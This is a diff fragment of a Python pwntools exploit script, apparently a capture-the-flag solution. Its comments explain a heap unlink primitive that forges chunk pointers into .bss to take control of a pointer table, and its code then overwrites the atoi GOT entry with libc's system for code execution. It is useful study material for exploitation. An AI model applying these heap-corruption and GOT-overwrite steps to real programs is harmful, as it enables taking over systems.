@@ -67,24 +67,21 @@ def main():
     '''
     - it'll perform some kind of unlink.
     
-    next_chunk[-2] = leak+0xd8 
-    next_chunk[-1] = 0x00602090
+    next_chunk[-2] = leak+0xd8;
+    next_chunk[-1] = 0x00602090;
 
-	if (next_chunk[-1] != (ulong *)0x0) {
-        *(ulong **)((long)next_chunk[-1] + ((*next_chunk[-1] & 0xfffffffffffffffc) - 8)) =
-        *next_chunk[-2];
-    }
+	if (next_chunk[-1] != (ulong *)0x0)
+        *(ulong **)((long)next_chunk[-1] + ((*next_chunk[-1] & 0xfffffffffffffffc) - 8)) = *next_chunk[-2];
 
-    if (*next_chunk[-2] != (ulong *)0x0) {
-        *(ulong **)((long)*next_chunk[-2] + (**next_chunk[-2] & 0xfffffffffffffffc)) =
-        next_chunk[-1];
+    if (*next_chunk[-2] != (ulong *)0x0)
+        *(ulong **)((long)*next_chunk[-2] + (**next_chunk[-2] & 0xfffffffffffffffc)) = *next_chunk[-1];
 
     - it will use each ptr's addr and the size at that addr to calculate the place where the other ptr is written to
     - I created a fake size (after calculating the offset) so that the 4th entry will be overwritten with 0x00602090 (the start of .bss)
     - we have to keep in mind that the reverse will happen to. that's why I couldn't overwrite with libc's system directly because it will try to write at invalid addr
     - .bss was fine and we also had access to the ptr storage. We can now control the ptrs 
     '''
-    
+
     write(4, p64(0)*2 + p64(exe.got['atoi']))
     write(1, p64(libc.symbols['system']))
     
